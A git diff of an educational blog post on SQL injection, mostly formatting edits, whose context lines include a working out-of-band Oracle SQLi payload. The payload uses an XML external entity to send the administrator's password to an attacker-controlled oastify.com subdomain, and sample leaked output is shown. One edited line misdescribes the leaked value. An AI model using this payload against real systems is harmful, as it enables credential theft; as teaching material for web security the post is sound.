@@ -6,7 +6,7 @@ categories: 'Web 101'
 tags: Web
 cover: https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SQLi/cover_pic.jpg?raw=true
 ---
-SQL Injection (SQLI) is a common web security vulnerability that occurs when an attacker manipulates the SQL query sent from an application to its underlying database. By altering the intended query, attackers can access, modify, or delete data without proper authorization. This form of attack typically occurs in the WHERE clause of SELECT queries and can lead to severe consequences such as unauthorized data access or even complete compromise of the server (e.g., gaining administrative privileges).<!--more-->
+`SQL Injection (SQLI)` is a common web security vulnerability that occurs when an attacker `manipulates the SQL query sent from an application to its underlying database`. By altering the intended query, attackers can access, modify, or delete data without proper authorization. This form of attack typically occurs in the `WHERE` clause of `SELECT` queries and can lead to severe consequences such as `unauthorized data access` or even complete compromise of the server (e.g., gaining administrative privileges).<!--more-->
 
 ## Basic SQLI Techniques
 Attackers often use simple techniques to detect if an application is vulnerable to SQLI. One such method is injecting single quotes (') into the query to cause a syntax error and gauge the system's response. Additionally, Boolean-based SQLI techniques involve injecting conditions such as:
@@ -96,9 +96,9 @@ The above example performs a DNS lookup on a domain controlled by the attacker. 
 ```sql
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual—
 ```
-The query will be able to leak the password as part of the subdomain, such as
+The query will be able to leak the password as part of the subdomain, such as `upneavivflfs9z2xmz65vswzbqhi59ty`.
 
-`example output:`
+`Example output:`
 ```
 p4ssw0rd.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com
 ```
